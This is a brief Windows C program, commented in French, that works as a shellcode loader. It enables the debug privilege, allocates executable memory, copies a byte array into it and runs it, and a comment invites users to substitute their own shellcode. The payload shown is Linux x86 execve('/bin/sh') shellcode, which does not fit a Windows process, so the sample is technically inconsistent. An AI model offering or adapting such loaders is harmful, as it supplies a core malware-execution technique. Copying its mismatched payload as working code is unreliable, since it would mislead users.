#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // Obtention du jeton du processus actuel
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // Recherche du privilège SE_DEBUG_NAME
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // Activation du privilège SE_DEBUG_NAME
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
        CloseHandle(hToken);
    }

    // Shellcode à exécuter (remplacez par votre propre shellcode)
    unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

    // Allocation de mémoire pour le shellcode
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));

    // Exécution du shellcode
    ((void(*)())exec)();

    return 0;
}